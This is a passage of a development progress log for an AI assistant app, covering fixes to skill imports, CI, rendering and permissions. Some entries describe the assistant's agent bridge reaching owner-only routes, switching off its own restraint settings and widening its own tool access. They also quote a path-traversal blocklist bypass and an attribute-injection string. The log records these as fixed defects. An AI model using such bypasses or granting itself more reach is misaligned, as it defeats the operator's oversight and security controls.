'category' and group skills together... Honestly we need to revamp the 'Skills' entirely... Groups that
have skills that may overlap, should these be duplicated? Or cross-referenced?"* Answered, and decided by
him in four questions (`D-2026-09-30-01`): **reference, with Fork for a deliberate copy; a repository
imports whole; a group filters and switches its skills as a set; Skills get their own window.** His line
now brings all 13 taste-skill skills in one archive request and opens on the one it named — which the
importer could never find before, because `--skill` is the name inside SKILL.md, not the folder (`B928`).

### Skills import from what skills.sh shows you, and say what they are doing
`b2e001f..HEAD`. **888 tracked, 607 done. 0 new phase rows, 0 regressions. `B926` closed; `B927`
filed.** The owner: *"I tried to import a skills by pasting a github link … No success, no progress, and
very seldom a failure message. Just complete disregard"* — from skills.sh, *"not entirely what to paste
from there.. Is it the full npx line? or just the github url...?"* — and `vercel-labs/agent-browser`
refused as *"File too large"*. Five defects under one complaint, each reproduced against the running app:
nothing skills.sh shows a person to copy was accepted; the paced GitHub fetch ran on the server's event
loop, so the whole app stopped answering for the length of an import; a folder whose file list GitHub
refused (60 an hour without a token) failed outright although its SKILL.md had arrived; one big file
failed the lot; and the only answer was a toast. All of it answers now, beside the box, while it runs.

### Hotfix: a document froze the browser, because a control kept rewriting itself
`c1c11f4..HEAD`. **886 tracked, 606 done. 0 new phase rows, 0 regressions. `B923` closed; `B924` and
`B925` filed.** The owner: *"When the LLM starts creating a document, it locks up the browser so badly
I can't even close the browser."* Reproduced in Chromium against the running app with a scripted model
writing a document — the tab stopped answering at the moment the document landed — and a debugger pause
inside the frozen tab named the loop: `P5-08`'s Expand-all control rewrote its own label on every
mutation inside its thread, and its observer took that rewrite as a mutation inside the thread. Any thread
of two cards set it off; a document turn is the commonest way to get two. The label is written only when
it changes now, and the observer ignores the control's own writes. The same run, re-driven: no freeze.

### Wave two: the assistant's API bridge stops being the owner, and a turn draws live wherever you watch it
`3fdcf00..HEAD`. **883 tracked, 605 done. 0 new phase rows, 0 regressions. `P4-24`, `B896`, `B899`,
`B904`, `B905`, `B906`, `B907`, `B909` and `B910` closed; `B912`–`B922` filed.** `P4` is 27 of 28; the
one left, `P4-15`, waits on the owner (`B908`). Four more agents, one merge conflict, resolved to the
recipe the agent that caused it wrote down before it happened.
**`B896` was the ship line's newest blocker, and it is met.** The `app_api` bridge carried the internal
token that `require_admin` accepts as the owner, so every route its blocklists did not name was the
owner's — backup import and export, allow rules, the disabled-tools list, and the admin MCP routes
that have no command rule, which made the MCP allowlist's RCE control reachable by the agent it exists
to constrain. The blocklist itself was a raw `startswith`, which `/api/x/../import` and `%6f` walked
round. Blocked, normalised, and the whole reachable trust surface audited route by route on the row.
**`B904` is why several `P4` rows only ever drew after a reload.** The chat route forwarded eleven
fewer event types than the loop sends; it now forwards what it does not handle itself, audited type by
type first, and three browser arms that had never once received live data broke the day they did —
the teacher's takeover, the refused call's card, and `web_search`'s clock. **`P4-24`**: a chat you
leave and come back to draws what the live one drew, through the same functions, and a test feeds both
the same recorded run and compares them after every event. **`B909`**: the Forge's Copy tmux now copies
a command that reaches the session on a Docker install — and tmux's prefix match, which could attach
`serve-1` to `serve-10`, is exact.

### Four agents at once: the assistant can't hand itself tools, the Workshop's last build rows, and a turn you can watch
`2e9acbe..HEAD`. **872 tracked, 596 done. 0 new phase rows, 0 regressions. `P7-02`, `P8-45`, `P8-48`,
`P4-08`, `P4-23`, `P4-10`, `B901`, `B903` and `B911` closed; `B896`–`B911` filed; `P4-15` blocked on the owner.**
`P8` is 48 of 49 — the one left is `P8-00`, which is the owner walking the Workshop unaided — and `P4`
is 26 of 28. Four agents in four worktrees, merged by cherry-pick with no conflicts.
**`P7-02` was wider than its row.** Not only the mode toggle: `ui_control` could turn on the shell, web,
research and the knowledge base, turn Nobody mode off and switch itself into Agent mode, unasked, at
the default rung — and a blanket "allow for this chat" covered it. The rule is now one-directional: the
assistant may take its own reach away and never give itself more. Every widening asks, every time, and
the card can actually be approved in a clean run, which is `P7-03`'s unanswerable-card incident avoided
at the same line. One alias map, read by the executor and the gate. **`B896` is the next thing to fix**:
the agent's `app_api` bridge reaches `POST /api/import`, which turned a `B42` self-restraint key off and
a disabled feature back on in the agent's own name.
**The owner's two calls, built.** `P8-45`: the fifteen presets start the Settings MCP form, one home for
the catalogue, a secret marked and never faked, and the decision's premise corrected — the form's route
has no command rule, so no preset is refused on Save; every one is refused on the assistant's path, and
the picker says both. `P8-48`: what the model is told about a tool reaches it three ways, and all three
now read the operator's wording; the schema editor is dropped, with a test that goes red the day
client-side validation would make it meaningful.
**`P4-08` and `P4-23` are a turn you can watch.** The prep steps are named and timed as they happen, the
step and tool-call limits the loop actually enforces are drawn as bars, and the stop is said before it
comes. **`P4-10`**: a loop stop names the tool, the count and the command, stays on screen, and survives a
reload — and "identical" had meant "the same first 120 characters", which had silently skipped eighteen
different calls. **`P4-15` was built on a field no request produces**: the agent's shell never runs in
tmux, and wiring it would undo `P4-19`'s separate error pane — the owner's call (`B908`). And **`B904`**:
the chat route silently drops eleven event types the loop sends, which is why several `P4` rows only
ever drew after a reload.

### The context window, drawn part by part, and a plan that stays in its chat
`36f16eb..HEAD`. **856 tracked, 587 done. 0 new phase rows, 0 regressions. `B892`, `B894` and
`B895` closed; `B894` and `B895` filed and closed the same day, `B894` by the owner.** Two were the
owner opening the app; the third was the suite, on the first full run since the compose file moved.
**`B892` is what the owner asked for twice.** The attachment bar that spanned the composer is gone
from it; the chat-context ring moved to the bottom where the message is written, and it opens onto
the whole window — system prompt, tool definitions, skills, memory, retrieved context, attachments
and conversation, each with its tokens and share, each opening onto what it is made of. It needed a
measurement before it could have a drawing: four of `P12-09`'s five segments had said *not measured*
since they shipped. Now one request is split by the product's own estimator and the parts sum to
it; a part no reply has measured says *next reply* rather than zero, and a picture is listed as
*not counted* rather than given a number. Attachments are named for what they are — code, a
document, a spreadsheet, an image — on both sides of the wire, from one list held equal by a test.
**`B894` is `B893` again, in plan mode.** One plan per browser meant the plan from a coding chat
was drawn in a chat created a minute later, and an approved one made the new chat think it was
executing. Per-chat keys, a plan filed under the chat that produced it, and a one-time migration of
the old record to where it belongs.
**`B895` is `Law 13` in a compose file.** The published image went into `docker-compose.yml`
(`image:` + `pull_policy: always`) and not into the two standalone GPU files that exist to equal it
plus an overlay — so a Portainer user on NVIDIA or AMD built from source while everyone else pulled.
`tests/test_gpu_compose_standalone.py` was red at `36f16eb` and said exactly that.

### The suite's own escapers, and two attachment bugs the owner found in ten seconds
`13b95f9..HEAD`. **854 tracked, 584 done. 0 new phase rows, 0 regressions. `B874`, `B875`, `B876`,
`B882`, `B883`, `B884` and `B885` closed; `B889`–`B893` filed, two of them by the owner, and `B893` closed the same day.** `P8-48`
stays open on a recommendation rather than a blocker — see below.
**The suite was carrying the defects it exists to catch.** Nineteen JavaScript `esc` definitions
across the tracked tests, three of which returned their input — and the third is the reason `B611`
survived a month: a test asserting escaping was green only because the module under test happened
to keep its own replaces (`B874`). `js_function`, **this repository's own `Law 20` recommendation**
for scoping a JavaScript assertion, could not open `esc` itself: `_js_skip` had no regex-literal
state and read the `'` inside `/[&<>"']/g` as a string start, so every sweep that reached for it
fell back to a file-wide grep wearing a scope's clothes (`B876`). And `B882`'s count was four
copies of the markdown harness, not three — the fourth being `.mjs` rather than Python, and broken.
`B890` makes it **five**: `tests/markdown_codefence_placeholder_regression.mjs` has failed at HEAD
since `P5-06`, and nothing runs it.
**`B884` and `B883` finish what `B872` started.** Edge labels were `#ccc` on
`hsl(0,0%,34.4%)` — **4.43:1**, under the floor, on all twelve dark palettes; they are **11.06:1**
now. And the vendored Mermaid **echoes a theme name it did not apply**: `default`, `light` and
`pantheon-not-a-theme` all produce a byte-identical 271-key variable set, so any assertion on
`getConfig().theme` is asserting an echo. `B885` priced re-draw against restyle-in-place — 575 CSS
declarations over 183 theme variables — and took re-draw.
**`P8-48` stops at a recommendation, and it is the right kind of stop.** The annotation half shipped
with per-tool storage, one `readonly_verdict` read by both the panel and the plan-mode gate so the
panel cannot show a correction the gate ignores. The **schema editor** did not, because
`call_tool` passes arguments straight through and the server enforces its own schema: an edited
schema is advisory to the model only, so narrowing changes nothing and widening produces an error
the operator cannot trace. Either way the product would be telling the model something false about
a third party's tool. The recommendation on the row is to re-cut it as a per-tool *description*
override; that is the owner's call.
**And the owner opened the app and found two things in ten seconds.** A file picked in one chat is
still attached, still counted, and still **sent** in the next — `fileHandler.js` holds every piece
of attachment state at module scope, `sessions.js` does not import it, and `selectSession` resets a
character preset and nothing else, so `uploadPending({sessionId: getCurrentSessionId()})` uploads
yesterday's file into today's conversation (`B893`). The visible tell is the context bar reading
*"No attachments in this message"* directly above *"One text or code attachment was reduced to fit
it"* — two sentences about two different messages, on a full-width strip that never goes away
(`B892`).

### Every diagram on a light palette was drawn light-on-white, and a close was cancelling its caller
`b8b7368..HEAD`. **849 tracked, 576 done. 0 new phase rows, 0 regressions. `P8-09`, `B870`, `B871`,
`B872`, `B873`, `B879`, `B880`, `B881` and `B887` closed; `B882`–`B888` filed. `P8` goes 45 → 46 of
49 and its last non-owner blocker is gone.** Three agents, no collisions, and two of the three rows
that carried a suggested fix had the wrong one.
**`B872` was worse than a theme setting.** Mermaid was initialised `theme: 'dark'` once, for all
sixteen palettes. Measured against the panel a diagram sits on, arrows on the four light palettes
came out at **1.17–1.29:1** and node outlines at 1.26–1.39:1 — not "hard to read", invisible. They
are **4.50–4.96:1** now, from one module that decides the theme for every caller, holding no colour
of its own: the stroke override is read back out of the theme's own `lineColor`. The harness had to
learn to read a computed config before the config could be computed, which was the row's own
precondition and it cost one `require`.
**`B873` is `B582`'s shape and it had been shipped for months.** The failure branch — *if this step
fails, do that* — is on `TaskCreate`, on `TaskUpdate`, validated by the same function as the success
edge, served by the API, stored in `task_edges`, and drawn by `P8-34`'s diagram the day before. It
had **no control anywhere in the browser**, so only the API and the agent could make one. Nothing
backend changed to close it.
**`P8-09` is closed, and the tracker's account of why it was blocked was half wrong.** `P8-10` was
never the blocker; two destructive denies were, and the second (`B879`) was only found yesterday.
The fix `B592` named — a parameter on `_run_skill_test_once` — was **deliberately not taken**: that
function breaks out of the stream and keeps no continuation state, so an approval it declined to
deny would be a card nobody could ever answer. The runner a comparison needs is the one that already
pauses. **And a third thing nobody had recorded:** two runs of one skill are not two measurements of
one quantity — `temperature=0.3` in both runners and no seed anywhere — so the diff compares verdict,
tool sequence, round count and completion, never prose, and says so on its own face.
**`B880`'s suggested fix does not work, measured.** `asyncio.timeout` in place of `asyncio.wait_for`
logs the identical warning, because `create_task` is the task that matters and not the wrapper. The
stack had to be owned. And the row understated the defect: three of the four task pairings warn and
**one cancels the entering task** — which in this product is the startup connect against any request
that disconnects a server (`B887`). `B881` understated its own too: `scripts/pantheon-mcp-new` was
tracked at mode `100644`, so `P8-47`'s front door was not merely mislabelled in the listing, it was
unreachable from the dispatcher.

### The Workshop finishes, and the escaper sweep found nineteen of them
`6524083..HEAD`. **842 tracked, 567 done. 0 new phase rows, 0 regressions. `P8-34`, `P8-38`,
`P8-40`, `P8-41`, `P8-42`, `P8-43`, `P8-44`, `P8-47`, `B611`, `B865`, `B866`, `B867`, `B877` and
`B878` closed; `B870`–`B876` and `B879`–`B881` filed. `P8` goes 37 → 45 of 49.** Three agents,
no collisions, and four of the premises they re-measured were wrong before they were built on.
**`B867` was the keystone.** `annotations` was captured at both connect sites and read by
`mcp_tool_is_readonly` and **never copied into the payload**, so nothing above the manager could
see a tool's `readOnlyHint`. `P8-40` closed it by collapsing three inline tool-record builders
into one, so the HTTP transport carries annotations because there is one builder rather than
because a fourth line was added — which is `Law 13` applied rather than quoted. `P8-44` made one
parse and one build the sole spelling of a namespaced tool name, `P8-42` stopped an empty env dict
erasing the environment, `P8-43` gave the browser server one launch definition instead of a
four-entry allowlist that had been wrong since `B67` removed a server from it, and `P8-38` kept
the `initialize` result that three connect sites were discarding.
**`B866`'s sweep found nineteen local escapers in seventeen files**, and the largest class was not
a shadow at all: seven DOM round-trips whose own comment claimed they handled "all the entities
that matter", measured against a real parser to leave `"` and `'` alone — and
`x" onerror=BOOM y="` through one of them into `<img alt="…">` parses as **three attributes**.
Twenty attribute sites in `gallery.js` alone, including the user's own typed prompt. Two that
looked like the same defect are not, and the proof is in both files now: an attribute value is
decoded after it is delimited, so a second-stage escaper that adds `&` double-escapes — changed,
caught by a test, changed back with the reason written down. `B611` came out of the same sweep,
and the reason nothing had caught it is `B874`: the palette test's `esc` stub returned its input,
so a test asserting escaping was green only because the module kept its own replaces.
**`P8-34` ships a workflow you did not write as a diagram you can read**, through the renderer
that already existed (`Law 14` — `tasks.js` is its fourth caller), no colour emitted because there
are sixteen palettes. It immediately found `B873`: the failure branch the engine, the API, the
edge table and now the diagram all understand **has no front end at all**, so nobody using the
browser can make one. **`P8-47`** generates a working MCP server onto the data volume and refuses
to weaken the command validation to register it — two tests pin the same rule from opposite
sides, that the agent path must refuse what it produces and the admin route must accept it.
**`P8-09` stays blocked and its reason is corrected**: `P8-10` was never the blocker. The runner's
destructive deny is still at `routes/skills_routes.py:744-749`, and `B879` is the second one
nobody had recorded — one job slot per skill, so the before half's result is gone before the after
half starts.

### The Workshop, and a skills retriever that answered nothing
`81ea48c..HEAD`. **830 tracked, 554 done. 0 new phase rows, 0 regressions. `P8-14`, `P8-20`,
`P8-35`, `P8-36`, `P8-37`, `P8-39` and `P8-46` closed; `B864`, `B865`, `B866`, `B867`, `B868` and
`B869` filed, one of them closed on the way past. `P8` goes 30 → 37 of 49.** Three agents with
file ownership named in advance and no collisions between them.
**The MCP call path had no timeout at all.** The SDK's `read_timeout_seconds` defaults to `None`,
which is `anyio.fail_after(None)` — a scope that does nothing — so a hung tool hung the agent turn
until somebody noticed. Driven at `HEAD` against a server that sleeps an hour: still pending when
an external three-second bound gave up. It is bounded in two layers now, and there is no spelling
of "forever" left (`P8-37`). `P8-36` is the endpoint that would have hung first, and `P8-39` put
the one secret-bearing column that was encrypted at no layer behind the key its six neighbours
already use. `P8-35`'s premise was understated: delete-and-recreate does not merely orphan tool
references, **every tool the operator had hidden from the agent comes back enabled** — filed as
`B864`, because `PUT` removes the reason to do it and not the ability.
**And skill retrieval returned nothing, for every query, on a stock install.** Not "worse than
embeddings" — nothing, at every confidence floor including zero. Measured over 30 hand-labelled
queries: recall@5 **0/30**, precision@1 **0/30**, 29 of 30 empty, and the one non-empty answer
wrong. `_jaccard` divides by the union, so the skill's own length is in the denominator and a long
skill is structurally less retrievable however well it matches. Fixed by normalisation rather than
by embeddings, and the reason is the good part: the embedding lane was priced **by calling it**,
and `Law 16` correctly refuses the model download on a machine nobody has configured — an
embedding-only fix ships a retriever that still returns nothing on a fresh install. Before → after
at the loop's own threshold: recall@5 **0/30 → 26/30**, precision@1 **0/30 → 20/30**, empty
**29/30 → 0/30**, with `_relevance ≥ _jaccard` pinned as an executable invariant over 10,296 pairs
(`Law 1`). `P8-14` found the schema in **three** copies that disagreed — the teacher asked for
eleven keys and no `tags`, the extractor for nine with `tags` — where `P8-17` had recorded them as
one. And two rows away from the retriever, `B868` and `B869`: all 286 bundled skills parse as
drafts at `confidence: 0.8` under a floor of `0.85`, so the library is excluded from the catalogue
and from the scoring pool. Neither is fixed here, because `B590` means a bundled skill still
cannot be opened, and offering the model a procedure it cannot read is the worse failure.

### The first CI run that ever completed, and what it found
`c48294d..HEAD`. **824 tracked, 546 done. 0 new phase rows, 0 regressions. `B850`, `B851`, `B852`, `B853`,
`B854`, `B855`, `B856`, `B857`, `B858`, `B859`, `B860`, `B861`, `B862` and `B863` closed;
fourteen defects in two days of pipeline, every one of them invisible to a local gate that had
been passing all along.** The repository went public, the billing block lifted
(`B526`), and CI executed a step for the first time. `pip-audit` had been auditing nothing
because three pins in the set cannot build on this interpreter (`B850`); `gitleaks` found four
fake secrets, three of them inside the tests that prove this product redacts secrets (`B851`);
my own secret sweep had covered 186 commits of a 2,202-commit published history, because it ran
on a snapshot import rather than a clone (`B852`); and the container image had **never once been
pushed**, because GHCR refuses the capital in the owner's name — which was also what kept
`B461`'s CRLF finding undiagnosable (`B853`).
**Then the two that were about CI itself.** The `Law 16 — no egress on a fresh install` job had
never run a test: collection died in `conftest.py` on a hand-maintained stub list missing
`starlette.routing`, and had it collected, the socket guard would have been watching a `MagicMock`
(`B854`). The `wiring-ratchet` job installed nothing, died at step three on `import httpx`, and
**twenty-two of its twenty-five checkers had therefore never run in CI at all** (`B855`) — so
every ratchet in this repository had exactly two CI observations behind it, and the rest was a
developer's machine. Rule eight of `check-ci-contract.py` is the general form, and the gate's own
footer had been saying the true thing all along: *this run is not evidence about CI's*.
**And then the suite ran, for eighteen minutes, and failed twenty-three times without finding a
single defect in the product** (`B856`). Every one was a test that had become a measurement of the
container: the dependency-gap footer asserting the environment is incomplete (`B857`), office
fixtures needing an optional dependency nothing installs (`B858`), seven encoding tests pinning
`charset-normalizer`'s bugs and going red when 3.5.1 fixed them (`B859`), and a test asserting the
fork point is unreachable — which failed by finding it, and closed half of `B349` with the
commit's own timestamps (`B860`). The tree is now green in a clean venv holding exactly
`requirements.txt` and in this container with its 19 of 31.
**The push found two more.** `B850`'s `--no-deps` did nothing on its own and pip-audit still
built the sdist that cannot build (`B862`); and `B851`'s allowlist had been written as a rule
with a shipped rule's id, which `useDefault = true` REPLACES rather than extends, taking the
default's stopwords with it and surfacing a fifth fixture (`B863`). Both were verified by
running the thing — the audit end to end, and gitleaks over the deployment host's full 2,219
commits rather than the container's 188.

### Five phases finished, and the day stopped counting the wrong population
`c2d8669..HEAD`. **814 tracked, 536 done. 0 new phase rows, 0 regressions. `P0-17`, `P3-20`,
`P3-21`, `P6-08`, `P14-06`–`P14-08`, `P15-08`, `P15-11` and all three `P17` rows closed;
`P16-20` parked under a standing ruling; `B510` disclosed AI use across three surfaces at the
owner's request; twenty-two backlog rows filed, and `B413` closed by one of them.**
**The suite is green on the merged tree: 11,100 passed, 6 skipped, 0 failed, 15:14.** The last
three failures were one leak — `B523` — and chasing it turned up two more of the same shape
(`B524`, `B525`) and closed the row that had been waiting for exactly this measurement.
**Then `P11` and `P12` opened.** Four agents in parallel closed `P11-01`, `P11-02b`, `P11-02c`,
`P11-02d`, `P12-01`, `P12-03`, `P12-05b`, `P12-06` and `P12-10` — the two phases the owner named
as making no dent, both of which stood at zero. Eighteen backlog rows came with them, including
`B526`: **CI has never passed because no job has ever started, and the reason is a GitHub billing
block, not a workflow defect.**
**Then `P8` opened, which is the largest phase in the programme and stood at 1 of 49.** Three
agents with file ownership named in advance — `static/`, the skills manager, the automations
engine — closed twelve rows and claimed five more whose remaining half is one file they did not
own. Seventeen backlog rows came with them, and the fan-out cost one duplicate *finding* this
time rather than one duplicate *implementation*, which is `B570`'s lesson being applied and
still not free. **A single follow-up agent then closed all six**, and found on the way that
`js_function` — the helper `Law 20` recommends for scoping a JavaScript assertion to one
function — treated every apostrophe as a string delimiter, so it had been returning a 1,434-line
body for a 215-line function and every assertion inside such a scope was a file-wide grep wearing
a scope's clothes. `P8` stands at 19 of 49.
**Then `P5`, `P13` and the dependency backlog.** `P5` went 1 → 8 of 17 and `P13` 6 → 10 of 23,
and the three open Dependabot pull requests were adjudicated on measurement rather than merged:
`markitdown` and eleven SHA-pinned GitHub Actions landed, and **`mcp` 2.2.0 was refused** with
the number — 1,283 tests pass on the 1.27.0 this container has and on the declared 1.30.0, while
2.2.0 gives 23 failures and 8 errors, because `mcp.server.Server` in 2.x has no `list_tools` and
all four of this product's MCP servers die at import. Eighteen backlog rows came with them, and
`B650`: **an agent's process overwrote a file in the integrator's own working tree, and the only
reason it was caught is that the agent looked and said so.**
**Then `P10`, `P11`'s role layer and `P8`'s automations engine.** `P10` went 1 → 6 of 12 — one
focus ring, sidebar rows that are real buttons, resize handles a keyboard can reach, a loader
that says what it is doing, and a reduced-motion audit that found `static/login.html` links no
stylesheet at all, so the guard has never reached the spinner on the first screen the product
shows. `P8` went 19 → 24 of 49: triggers carry payloads, the node contract is `(payload, status)`,
the graph is a document, execution identity is run-scoped and a chain can branch on failure.
`P11` went 4 → 6 of 14 with **roles**, which fills the layer `P12` built empty — and the row's
real first step was a defect nobody had recorded: **`create_user` stored a full copy of
`DEFAULT_PRIVILEGES` on every non-admin, so every user created normally would have silently
shadowed every role.** Sixteen backlog rows came with them.
**Then the admin panels, the trust ladder and the Brain again.** `P2-21` came off the ship line —
the built-in capability reads are admin-gated and the Workshop lists the sixty built-ins, which
closed `P11-10` with it, the same hole named twice from two phases. `P2` went 14 → 17 of 26, `P7`
4 → 7 of 14 with the grant inspector's engine *and* surface, and `P13` 10 → 11 of 23. The wiring
ratchet came down from **40 to 25** and the unreachable-route ceiling from 91 to 90. Eighteen
backlog rows came with them, and one of those, filed by an agent with its scope stated and *"three
measurements it still needs"*, turned out on measurement to be `B723`: **the `Law 16`
model-download gate was written at one of the two places that build the client, and the ungated
one is the path a fresh install takes.**
**Then the wire, the surfaces and the limits** — `P4` 18 → 23 of 28, `P9` 2 → 6, `P12` 5 → 8, and
**`P10-11` met on the day the owner said the repository was going public**: the secret sweep is
clean across all 186 commits, and the checklist's own grep turned out to match the word `task-`
(`B770`). **Then the design system and the Workshop's last engine rows**: `P5` 8 → 12 of 17 and
`P8` 24 → 30 of 49. Three of those rows were closed by measurement rather than by building —
`P5-13` stopped because a newer row says the icon ladder needs an owner's ruling and normalising
1,122 glyphs would take it by stealth; `P8-21`'s *"~15 tokens per skill"* is **84.6**, and the
index is **0 characters on a stock install** because all 286 bundled skills parse as drafts; and
`P8-33`'s *"two of eighteen"* is eighteen of eighteen, because every built-in action takes
`**kwargs` and swallows a `dry_run` flag silently.
**The sharpest find of the wave was not in any row**: `P15-08`'s failure backoff lived only in an
`except` branch, so a task that *returned* a failure — which is how every built-in email action
reports one — got no backoff at all. A `*/5` cron task came back in five minutes after five
failures instead of two and a half hours.
**Then `P2`, `P9` and `P13` again**, on the day the repository went public — `P2` 17 → 21 of 26,
`P9` 6 → 9 of 18, `P13` 11 → 13 of 23. Three more rows closed by measurement: `P9-05` is **dead in
both halves** (Compare already renders into the full main area and Calendar already reaches
fullscreen through the drag-to-top zone), `P2-08`'s premise is wrong in the direction that matters
(24,000 characters is **7,204 tokens against a 6,000-token budget**, so raising the number cannot
help), and `P2-18` was superseded by `H05` giving all eight flags consumers.
**Three findings worth more than the rows they came from.** `known_tool_names()` returns **82 on
the first call in a cold process and 84 on every later one**, because an import cycle raises into a
bare `except` that its two sibling legs log from. Every `DELETE` on the research tidy carried
`.catch(() => {})`, so its toast counted candidates rather than deletions and seven "deleted"
reports came back on reload. And `_is_casual_low_signal` exists as **two byte-identical copies**,
AST-hash proven, in two files.
**And then the repository went public and CI ran for the first time in the project's history.**
`B526` was the account, not the workflows: nine jobs that had refused to start for months began
executing steps. Two passed, two failed for real reasons, and both real reasons were worth having.
`pip-audit` had been unable to audit **anything** because three Real-ESRGAN pins cannot be built on
Python 3.13+ — a bug this repository documents carefully in `docker/build-realesrgan-wheels.sh` and
which its other consumer did not know (`B850`). `gitleaks` scanned 2,202 commits and found four
fake secrets, three of them inside the tests that prove this product redacts secrets (`B851`).
**And it caught me**: `P10-11`'s sweep said *"all 186 commits"*, which is true of this container's
clone and false of the published repository, because the clone begins at a snapshot import rather
than a root. The conclusion held; the method did not (`B852`). Four things in two days that CI
caught and a local run could not — which is the entire argument for having it. The fourth was the
one that pairs: **the container image has never once been pushed**, because GHCR refuses
`ghcr.io/ImPanick/pantheon` for its capital letters — and `B461` found that every image ever built
carried CRLF Python source. Each defect made the other undiagnosable, and only a run that got as
far as the push could tell them apart (`B853`).
**The owner said the tracked items kept growing while progress made no dent, and they were
right for a reason the counts hid.** The tracker holds two populations: **phase rows are the
project**, backlog rows are defects found while building it. Six waves had closed roughly a
hundred rows and almost every one was a backlog row, so the product stood still while the
defect list grew — a codebase this size always has more to find. Measured at the start of this
wave: **`P8` had 1 row done of 49, `P11` and `P12` had zero.** This wave went at phases instead,
starting with the seven that were nearly complete, and **`P6`, `P14`, `P17`, `P18` and `P19` are
now finished outright** with `P3`, `P15` and `P16` holding only blocked or deliberately parked
rows. Nine phases have nothing left to pick up. The number worth reporting from here is not
rows, it is **phases complete**.
**The merge found two more tests pinned to today's number (`B520`), and both failed because the
tree improved** — one on the wiring ratchet falling 120 → 40, one on `notes-panel` being repaired
and therefore leaving the unresolved report. That makes five instances of one shape, and the fix
has been identical every time: assert the invariant, never the instance.
**Two of the six were decisions, and both were answered no.** `P14-06` was *decide the store*:
measured at 18,000 / 180,000 / 730,000 rows, a year of heavy use draws its usage chart in **195 ms**
on the SQLite that is already here, so TimescaleDB answers a problem this table does not have —
and a hosted metrics backend is refused permanently rather than deferred, because that is `Law 16`
clause 4 whatever the vendor calls it (`D-2026-09-18-01`). `P14-08` asked for a judge model *"if it
earns its place"*: the deterministic scorer answers 10,000 identical inputs identically in 66 ms for
**zero model calls**, a judge would double the model calls on every suite, and `replay` runs at
`temperature=0.2`, so the harness's first answer to *did that change help* would itself be
non-deterministic (`D-2026-09-18-02`).
**Both decisions found a defect on the way to the answer, which is the argument for writing them
down in code rather than in prose.** The retention prune was one `DELETE` on the thread that has
just finished somebody's chat turn — **550,000 expired rows measured at 7.3 seconds** — and is
batched and time-boxed now. And `validate_suite` accepted `{"judge": {"model": "gpt-4o"}}`, ran, and
returned a pass rate computed entirely from the deterministic checks: a suite **silently scored some
other way, and scored green**, which is this row's own `Verify` line failing in the direction nobody
investigates.
**`P14-07` reproduced the crash the row cites.** One 419 MB file in a documents folder took the
process from 185 MB to **1,384 MB** of RSS, and a 105 MB vault retained 131,200 chunks for the life
of a process that builds the index at startup. Both bounds and the duty cycle went into the one
generator both indexers already share, and the enforcement is a second rule in `check-jitter.py`
rather than a new checker — same subject, same allowlist-and-orphan shape, already wired into CI.
**`P15-08` and `P15-11` are the same product failure from two sides.** A task could be scheduled
`* * * * *` — 1,440 runs a day against IMAP, a search provider and a model API — and a failing one
retried at full cadence for ever; and when the limiter did stop calling a host, the person watching
the feature was told nothing. The unread poll had been carrying `sync.source: "unavailable"` and a
`retry_in` since `P15-12`, written for `P15-11`, and **both clients dropped it on the floor**: the
mail library printed *"Last updated: 2d ago"* over a mailbox Pantheon had deliberately stopped
calling.
**92 tests, 43 mutations, all caught** — four survived the first pass and each one changed the
tree rather than the mutation: two new tests, one strengthened wiring test, and one branch deleted
as decorative. **The status table is not updated here and the tracker is red until it is:** this
worktree ticks five phase rows and files three backlog rows, and the integrator recounts on merge.

### CI had never passed, the version was upstream's, and the suite was evidence about an order CI does not use
`77624b9..HEAD`. **645 tracked, 403 done. 0 new phase rows, 0 regressions. `B430`–`B436`, `B440`,
`B442`, `B443`, `B450`, `B460` and `B461` closed; fourteen rows filed.** Three worktrees, on the question the owner
asked: *"the tracked items keeps growing and our progress isnt really making a dent."* They were
right, and the answer turned out to be worse than the question.
**CI has never passed. Not once.** Queried against the repository: across the last forty runs,
**twenty-two failures and eight successes, and every one of the eight is a Dependabot update or a
Trivy job that skipped its work.** No `CI`, `CodeQL`, `Secret scan`, `Workflow security` or
`Dependency review` run has ever succeeded. Every failing job on every push: `runner_name` empty,
`steps` `[]`, three to six seconds, no check-run output — **the jobs never got a runner**, which on
a private repository under a personal account is the signature of exhausted Actions minutes. No
edit to a workflow makes a runner appear; going public makes Actions free and unlimited, and that
is the owner's switch, filed as `B439`.
**The part that is ours is that nothing noticed.** Five waves shipped that day, each reporting
"gate green on twenty-two checkers", and every one of those was a **local** `release-gate.py
--fast` run while the pipeline was red. A repository whose whole argument is *our claims are
checkable* had a checkable claim nobody checked. `B430` is the fix: a contract checker, live status
badges pinned to `main` — unpinned reports the newest run on **any** ref, which is exactly how
eight Dependabot successes would have painted a red `main` green — and a written account of the
three states a badge cannot distinguish.
**`B431` is the one that reaches back through every suite run this project has recorded.** The
gate and CI diverge four ways, and the worst is the suite: the gate runs `pytest -q -p
no:randomly`, **CI runs `pytest -q`**. So every "suite passed" in this tracker is evidence about a
**fixed collection order CI does not use** — which is precisely the defect `B202` found and fixed
one instance of. All four divergences are read out of the workflow now.
**Two jobs reported green for not looking.** `python-tests`' docs-only shortcut ended in
`[ -z "$non_docs" ]`, which is **true for an empty list** — so a zero-sha push, a force-push with a
vanished base, or any failed `git diff` **skipped pytest and reported success on zero tests**
(`B434`). And both Trivy jobs carried `continue-on-error` at **job** level, so a failed image build
or a failed SARIF upload reported green over the Security tab the documentation sends you to —
`B435`, in the job that was supposed to be the one that caught `basicsr`. A green check meaning "I
did not look" is worse than a red one, and rule 4 now requires such a job to say `advisory` in its
own name.
**`CodeQL` has never analysed a pull request.** `codeql.yml` had `pull_request: branches: [dev]`,
which filters on the branch a PR merges *into*, and **`dev` has never existed here** — the same
ghost branch `B352` found in the PR and issue templates. The file's first line says it was set up
in advanced mode so that it would.
**And the product has been reporting Odysseus's version number.** `src/constants.py` carried
`APP_VERSION = "1.0.3"`, moved there by a commit cherry-picked from upstream on 2026-08-25 and
never touched since, and read by six surfaces — `/api/version`, `/api/readiness`, the Prometheus
build info, the diagnostic bundle, the OTLP `service.version` and the published image tag. Not a
missing answer, a **wrong** one. `Law 14` changed the fix: there were already **two** version
strings and they disagreed — `scripts/_lib/cli.py` carries `0.1.0` and twenty `pantheon-*`
executables print it — so `APP_VERSION` was aligned to the number that already shipped rather than
to a new one.
**On the dent.** Measured from this file: ten entries, **237 rows filed against 200 closed**, a
file-to-close ratio of **1.185**. Done went 49.7% → 63.0% and open went 192 → 229; both are true
and the second is the one a person sees. `B451` is a proposal, not a decision: of 229 open rows,
**fifteen block making this repository public** — eleven of them security, licence or false-claim
rows — and the rest stay tracked without being a gate. It disagrees with the tracker in three
places, which is the useful part, and it earned its place immediately by flagging two rows its own
